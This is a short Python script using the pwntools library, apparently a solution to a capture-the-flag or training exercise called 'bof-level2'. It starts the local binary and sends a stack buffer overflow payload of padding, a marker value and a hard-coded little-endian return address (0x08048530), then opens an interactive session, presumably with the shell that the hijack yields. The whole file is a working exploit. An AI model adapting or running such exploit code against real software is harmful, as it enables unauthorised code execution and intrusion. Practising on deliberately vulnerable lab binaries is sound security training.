#!/usr/bin/env python

from pwn import *;

p = process('./bof-level2');

output = p.recv();
print(output)

p.sendline('0' * 20 + 'ABCDEFGH' + '0' * 8 + '\x30\x85\x04\x08');

p.interactive()
